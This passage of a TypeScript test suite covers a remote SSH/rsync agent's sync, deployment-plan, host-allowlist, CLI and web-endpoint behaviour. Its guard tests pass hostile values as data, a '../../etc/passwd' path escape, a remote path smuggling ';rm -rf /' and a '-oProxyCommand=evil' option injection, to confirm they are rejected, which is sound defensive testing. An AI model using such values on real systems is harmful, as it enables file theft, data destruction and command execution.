    }
  }, 30_000);

  test("rsync + scp 双缺 → tool-absent + 计划车道指引（不是一句报错）", () => {
    const ws = tmpWs("sync-none");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      w(ws, "a.txt", "x");
      const r = withEmptyPath(() => remoteSync(ws, { host: "app", local: "a.txt", remote: "/tmp/a.txt" }));
      expect(r.ok).toBe(false);
      expect(r.kind).toBe("tool-absent");
      expect(r.reason).toContain("rsync");
      expect(r.reason).toContain("scp");
      expect(r.reason).toContain("org remote plan"); // 降级车道指引
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("local 越界（../../ 逃逸）→ jail 拒绝（先于工具探测）", () => {
    const ws = tmpWs("sync-jail");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const r = withEmptyPath(() => remoteSync(ws, { host: "app", local: "../../etc/passwd", remote: "/tmp/x" }));
      expect(r.kind).toBe("jail");
      expect(r.reason).toContain("越界");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);

  test("remote 路径元字符 / 以 - 开头 → denied；direction=download 远端在前本端在后", () => {
    const ws = tmpWs("sync-guard");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      w(ws, "a.txt", "x");
      const bad = withEmptyPath(() => remoteSync(ws, { host: "app", local: "a.txt", remote: "/tmp/x;rm -rf /" }));
      expect(bad.kind).toBe("denied");
      const dash = withEmptyPath(() => remoteSync(ws, { host: "app", local: "a.txt", remote: "-oProxyCommand=evil" }));
      expect(dash.kind).toBe("denied");
      // download：remote 源在前，local（工作区内落盘目标）在后
      const dl = withFakePath(() => remoteSync(ws, { host: "app", local: "incoming/", remote: "/srv/out/", direction: "download" }));
      expect(dl.ok).toBe(true);
      const line = dl.stdout.split("\n").find((l) => l.startsWith("ARGV:")) ?? "";
      const remoteIdx = line.indexOf("app@app.internal:/srv/out/");
      const localIdx = line.indexOf(path.join(ws, "incoming"));
      expect(remoteIdx).toBeGreaterThanOrEqual(0);
      expect(localIdx).toBeGreaterThan(remoteIdx); // rsync argv 源在前目标在后
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 30_000);
});

// ---- 6. 计划器纯函数多模式矩阵 + 自检 ----------------------------------------------

describe("远程 Agent：部署计划器（纯函数保底车道）", () => {
  test("四模式矩阵：git/rsync/container 各 4 段 1 式；all 6 段 3 式；每步 cmd+note 齐全", () => {
    for (const mode of REMOTE_DEPLOY_MODES) {
      const p = remoteDeployPlan({ host: "deploy.example.com", user: "deploy", mode });
      expect(p.mode).toBe(mode);
      expect(p.target).toBe("deploy@deploy.example.com");
      const deployPhases = p.phases.filter((x) => x.title.startsWith("②"));
      expect(deployPhases.length).toBe(mode === "all" ? 3 : 1);
      expect(p.phases.length).toBe(mode === "all" ? 6 : 4);
      for (const ph of p.phases) {
        expect(ph.title.length).toBeGreaterThan(0);
        for (const s of ph.steps) {
          expect(s.cmd.length).toBeGreaterThan(0);
          expect(s.note.length).toBeGreaterThan(0);
        }
      }
    }
  }, 30_000);

  test("内容要素：摸底含 bun --version / git --version / df；run 队列含 org.ts web --port 4600 + ORG_WEB_HOST=0.0.0.0 + 网关模型；回滚含改名式备份", () => {
    const p = remoteDeployPlan({ mode: "all" });
    const all = p.phases.flatMap((x) => x.steps.map((s) => `${s.cmd}\n${s.note}`)).join("\n");
    expect(all).toContain("bun --version");
    expect(all).toContain("git --version");
    expect(all).toContain("df -h");
    expect(all).toContain("org.ts web --port 4600");
    expect(all).toContain("ORG_WEB_HOST=0.0.0.0");
    expect(all).toContain("网关"); // XTransformPort 转发模型说明
    expect(all).toContain("proxy_buffering off"); // SSE 流式不被缓冲截断
    const rollback = p.phases.find((x) => x.title.startsWith("④"))!;
    expect(rollback.steps.some((s) => s.cmd.includes("mv ~/org-agent"))).toBe(true);
    expect(rollback.steps.some((s) => s.note.includes("不 rm"))).toBe(true);
  }, 30_000);

  test("模式选择：mode=container 不含 git clone 段；mode=git 不含 docker build 段（诚实边界：选式即窄面）", () => {
    const c = remoteDeployPlan({ mode: "container" });
    const cFlat = c.phases.filter((x) => x.title.startsWith("②")).flatMap((x) => x.steps.map((s) => s.cmd)).join("\n");
    expect(cFlat).toContain("docker build");
    expect(cFlat).not.toContain("git clone");
    const g = remoteDeployPlan({ mode: "git" });
    const gFlat = g.phases.filter((x) => x.title.startsWith("②")).flatMap((x) => x.steps.map((s) => s.cmd)).join("\n");
    expect(gFlat).toContain("git clone");
    expect(gFlat).not.toContain("docker build");
  }, 30_000);

  test("host/user 缺省占位（<user>@<host> —— 纯函数不依赖档案在场）", () => {
    const p = remoteDeployPlan({});
    expect(p.target).toBe("<user>@<host>");
    expect(p.phases[0]!.steps[0]!.cmd).toContain("<user>@<host>");
  }, 30_000);

  test("remoteSelfTest：27 项全绿（版本解析/档案校验/白名单/三类诊断/计划器/ping 统计/argv 形态）", () => {
    const t = remoteSelfTest();
    expect(t.ok).toBe(true);
    expect(t.passed).toBe(t.total);
    expect(t.total).toBeGreaterThanOrEqual(27);
  }, 30_000);

  test("computePingStats：[100,200,300] → 100/200/300；空 → null；小数一位四舍五入", () => {
    expect(computePingStats([100, 200, 300])).toEqual({ min: 100, avg: 200, max: 300 });
    expect(computePingStats([])).toBeNull();
    const st = computePingStats([10, 15])!;
    expect(st.avg).toBe(12.5);
    expect(computePingStats([1, 1, 2])!.avg).toBe(1.3); // 1.33… → 1.3（一位小数）
  }, 30_000);

  test("remoteArgv：identity ~/ 展开 + port 缺省 22 + -- 分隔（纯函数，无 spawn）", () => {
    const a = remoteArgv({ user: "u", host: "h", port: 2222, identity: "~/.ssh/k" }, "uptime");
    expect(a).toContain("-i");
    expect(a).toContain(path.join(os.homedir(), ".ssh/k"));
    expect(a).toContain("--");
    expect(a[a.length - 1]).toBe("uptime");
    const b = remoteArgv({ user: "u", host: "h" }, "uptime");
    expect(b).not.toContain("-i");
    expect(b).toContain("22");
  }, 30_000);
});

// ---- 7. CLI 冒烟（runOrg 真子进程）--------------------------------------------------

describe("远程 Agent：CLI 冒烟（org remote）", () => {
  test("org remote probe：探测输出 + 计划车道指引；org remote self-test 27/27", () => {
    const p = runOrg(["remote", "probe"]);
    expect(p.ok).toBe(true);
    expect(p.stdout).toContain("🛰");
    expect(p.stdout).toContain("ssh");
    expect(p.stdout).toContain("rsync");
    expect(p.stdout).toContain("ssh-keygen");
    expect(p.stdout).toContain("agent"); // SSH_AUTH_SOCK 环境
    const t = runOrg(["remote", "self-test"]);
    expect(t.ok).toBe(true);
    expect(t.stdout).toContain("27/27");
  }, 120_000);

  test("org remote hosts：档案未创建 → 拒绝一切提示 + 创建指引；写入后表渲染 + 判定", () => {
    const ws = tmpWs("cli-hosts");
    try {
      const r = runOrg(["remote", "hosts", "--workspace", ws]);
      expect(r.ok).toBe(true);
      expect(r.stdout).toContain(REMOTE_HOSTS_FILE);
      expect(r.stdout).toContain("未创建"); // 缺席 = 拒绝一切远程会话操作
      seedHosts(ws, [HOST_DEPLOY]);
      const r2 = runOrg(["remote", "hosts", "deploy", "--workspace", ws]);
      expect(r2.ok).toBe(true);
      expect(r2.stdout).toContain("deploy");
      expect(r2.stdout).toContain("deploy.example.com");
      expect(r2.stdout).toContain("2222");
      expect(r2.stdout).toContain("✓ 放行");
      const r3 = runOrg(["remote", "hosts", "ghost", "--workspace", ws]);
      expect(r3.stdout).toContain("✗ 拒绝");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 120_000);

  test("org remote exec：host 不在档案 → exit 1 + host-not-found + 创建指引", () => {
    const ws = tmpWs("cli-exec");
    try {
      const r = runOrg(["remote", "exec", "ghost", "uptime", "--workspace", ws]);
      expect(r.ok).toBe(false);
      expect(r.stderr).toContain("host 未在档案");
      expect(r.stderr).toContain(REMOTE_HOSTS_FILE);
      expect(r.stderr).toContain("不猜默认");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 120_000);

  test("org remote exec：白名单外命令 → 白名单拒绝 + allow_full 指引（exit 1）", () => {
    const ws = tmpWs("cli-exec-deny");
    try {
      seedHosts(ws, [HOST_PLAIN]);
      const r = runOrg(["remote", "exec", "app", "reboot", "--workspace", ws]);
      expect(r.ok).toBe(false);
      expect(r.stderr).toContain("白名单拒绝");
      expect(r.stderr).toContain("allow-full");
    } finally {
      fs.rmSync(ws, { recursive: true, force: true });
    }
  }, 120_000);

  test("org remote plan deploy --mode container：计划渲染（摸底/部署/run 队列/回滚四段 + docker build）", () => {
    const r = runOrg(["remote", "plan", "deploy", "container"]);
    expect(r.ok).toBe(true);
    expect(r.stdout).toContain("摸底");
    expect(r.stdout).toContain("docker build");
    expect(r.stdout).toContain("回滚");
    expect(r.stdout).toContain("ORG_WEB_HOST");
  }, 120_000);
});

// ---- 8. Web /api/govex/remote 四动作（probe/hosts/plan/ping）------------------------

describe("远程 Agent：Web /api/govex/remote 端点", () => {
  let server: Bun.Server;
  let base: string;
  let ws: string;

  beforeAll(() => {
    ws = path.join(TEST_RUN, "remote-web-ws");
    fs.rmSync(ws, { recursive: true, force: true });
    fs.cpSync(path.join(process.cwd(), "demo-ws"), ws, { recursive: true });
    server = startWebServer({ workspace: ws, port: 0, model: "scripted" });
    base = `http://127.0.0.1:${server.port}`;
    expect(server.port).toBeGreaterThan(1024);
  }, 120_000);

  afterAll(() => {
    server.stop(true);
  });

  test("GET action=probe：四工具 + OpenSSH 版本 + agent 环境六键齐全 + 计划车道 hint", async () => {
    const j = (await (await fetch(`${base}/api/govex/remote?action=probe`)).json()) as Record<string, any>;
    expect(j.ok).toBe(true);
    expect(j.ssh).toBeTruthy();
    expect(j.rsync).toBeTruthy();
    expect(j.scp).toBeTruthy();
    expect(j.ssh_keygen).toBeTruthy();
    expect([true, false]).toContain(j.agent_forwarding); // 布尔面（锁形态不锁环境——绝不回显 socket 路径值）
    expect(j.hint).toContain("org remote plan");
    // 在场时版本解析可观测（环境自适应：CI ssh 在场 / 沙箱缺席）——
    // open_ssh 解析结果嵌在 ssh 面对象内（Web 端点结构）
    if (j.ssh.available) {
      expect(j.ssh.open_ssh).toBeTruthy();
      expect(j.ssh.open_ssh.major).toBeGreaterThanOrEqual(7);
    }
  }, 60_000);

  test("GET action=hosts：档案状态 + 条目表；档案写入后可查询", async () => {
    const empty = (await (await fetch(`${base}/api/govex/remote?action=hosts`)).json()) as Record<string, any>;
    expect(empty.ok).toBe(true);
    expect(empty.exists).toBe(false);
    expect(empty.count).toBe(0);
    saveRemoteHosts(ws, [{ name: "deploy", host: "deploy.example.com", user: "deploy", port: 2222 }]);
    const j = (await (await fetch(`${base}/api/govex/remote?action=hosts`)).json()) as Record<string, any>;
    expect(j.exists).toBe(true);
    expect(j.count).toBe(1);
    expect(j.hosts[0].name).toBe("deploy");
    expect(j.hosts[0].host).toBe("deploy.example.com");
  }, 60_000);

  test("GET action=plan&mode=git：四段结构送达（摸底/git 式/run 队列/回滚）", async () => {
    const j = (await (await fetch(`${base}/api/govex/remote?action=plan&mode=git&host=deploy.example.com&user=deploy`)).json()) as Record<string, any>;
    expect(j.ok).toBe(true);
    expect(j.mode).toBe("git");
    expect(j.target).toBe("deploy@deploy.example.com");
    expect(j.phases.length).toBe(4);
    const flat = j.phases.flatMap((p: any) => p.steps.map((s: any) => s.cmd)).join("\n");
    expect(flat).toContain("git clone");
    expect(flat).toContain("org.ts web --port 4600");
  }, 60_000);

  test("GET action=ping&host=ghost → ok:false + host-not-found（Web 只读四动作不越档案门）", async () => {
    const j = (await (await fetch(`${base}/api/govex/remote?action=ping&host=ghost`)).json()) as Record<string, any>;
    expect(j.ok).toBe(false);
    expect(j.kind).toBe("host-not-found");
    expect(String(j.reason)).toContain(REMOTE_HOSTS_FILE);
  }, 60_000);

  test("未知 action → 400 + 动作清单；GUI 单页含 🛰 远程 Agent 区块要素", async () => {
    const resp = await fetch(`${base}/api/govex/remote?action=exec`);
    expect(resp.status).toBe(400);
    const j = (await resp.json()) as Record<string, any>;
    expect(String(j.error)).toContain("probe");
    expect(String(j.error)).toContain("ping");
    const html = await (await fetch(`${base}/`)).text();
    expect(html).toContain("🛰");
    expect(html).toContain("gxRemote");
    expect(html).toContain("remote"); // 面板动作按钮接线的要素面
  }, 60_000);
});

// ---- 9. 工具环 e2e（scripted 剧本驱动 direct.hsl —— wiring2/lsp.test.ts 同款）-------

const DIRECT = path.join(process.cwd(), "hsl/pool/direct.hsl");

describe("远程 Agent：工具环 e2e（remote_* 四工具）", () => {
  const WS_ROOT = path.join(TEST_RUN, "remote-ws");
  let wsSeq = 0;

  function toolResults(out: string): string[] {
    return eventsOf(out)
      .filter((e) => e.name === "journal" && (e.data as { name?: string })?.name === "tool_result")
      .map((e) => String((e.data as { detail?: string }).detail ?? ""));
  }

  test("remote_probe + remote_plan（只读模式可用）：result_summary 可观测 + 计划模式送达", () => {
    const WS = path.join(WS_ROOT, `t${String(++wsSeq).padStart(3, "0")}`);
    fs.cpSync(path.join(process.cwd(), "demo-ws"), WS, { recursive: true });
    const fixture = path.join(TEST_RUN, `remote-fixture-${wsSeq}.json`);
    fs.writeFileSync(fixture, JSON.stringify({ tracks: {
      "direct:notice-parser": [
        '<tool>{"name":"remote_probe","args":{}}</tool>',
        '<tool>{"name":"remote_plan","args":{"mode":"git"}}</tool>',
        "最终答案：远程探测与计划完成。",
      ],
    } }));
    const out = path.join(TEST_RUN, "out-remote", "probe-plan");
    fs.rmSync(out, { recursive: true, force: true });
    fs.mkdirSync(out, { recursive: true });
    const r = runDhv([
      "run", DIRECT, "--workspace", WS, "--task", "(direct) 远程 Agent 工具环",
      "--model", "scripted", "--fixture", fixture, "--out", out,
      "--allow", "bun,node,ls,cat,grep,diff,git",
    ], { ORG_ASK_EXPERT: "notice-parser", ORG_ASK_SESSION: "remote", ORG_ASK_QUESTION: "探测", ORG_TOOLS: "1" });
    expect(r.ok).toBe(true);
    const tr = toolResults(out);
    expect(tr.length).toBe(2);
    // 环境自适应：ssh（沙箱 ✗ / CI ✓）与 rsync（沙箱 ✓ / win runner 未必）锁形态不锁环境
    expect(tr[0]).toMatch(/remote_probe ok ssh=(✓|✗) rsync=(✓|✗) scp=(✓|✗)/);
    expect(tr[1]).toContain("remote_plan ok git 4段");
  }, 120_000);

  test("remote_ping host 档案门 + remote_exec 审批在环（process_spawn 门放行后档案门仍拒绝 —— 双层治理）", () => {
    const WS = path.join(WS_ROOT, `t${String(++wsSeq).padStart(3, "0")}`);
    fs.cpSync(path.join(process.cwd(), "demo-ws"), WS, { recursive: true });
    // 预置长期放行集（process_spawn —— remote_exec 的门；remote_ping 是只读工具无需门）
    fs.mkdirSync(path.join(WS, "runtime", "approvals"), { recursive: true });
    fs.writeFileSync(path.join(WS, "runtime", "approvals", "granted.json"), JSON.stringify({ capabilities: ["process_spawn"] }));
    const fixture = path.join(TEST_RUN, `remote-fixture-${wsSeq}.json`);
    fs.writeFileSync(fixture, JSON.stringify({ tracks: {
      "direct:notice-parser": [
        '<tool>{"name":"remote_ping","args":{"host":"ghost.example.com"}}</tool>',
        '<tool>{"name":"remote_exec","args":{"host":"ghost.example.com","command":"uptime"}}</tool>',
        "最终答案：均被档案门拒绝。",
      ],
    } }));
    const out = path.join(TEST_RUN, "out-remote", "gates");
    fs.rmSync(out, { recursive: true, force: true });
    fs.mkdirSync(out, { recursive: true });
    const r = runDhv([
      "run", DIRECT, "--workspace", WS, "--task", "(direct) 远程 Agent 门控",
      "--model", "scripted", "--fixture", fixture, "--out", out,
      "--allow", "bun,node,ls,cat,grep,diff,git",
    ], { ORG_ASK_EXPERT: "notice-parser", ORG_ASK_SESSION: "remote", ORG_ASK_QUESTION: "门控", ORG_TOOLS: "write", ORG_APPROVAL: "1" });
    expect(r.ok).toBe(true);
    const tr = toolResults(out);
    expect(tr.length).toBe(2);
    // remote_ping（只读）：host 不在档案 → error 摘要 + kind 可观测
    expect(tr[0]).toContain("remote_ping error [host-not-found]");
    // remote_exec：审批放行（granted process_spawn）→ 档案门仍拒绝（lib 内部先判）
    expect(tr[1]).toContain("remote_exec error [host-not-found]");
    expect(tr[1]).toContain(REMOTE_HOSTS_FILE);
  }, 120_000);
});
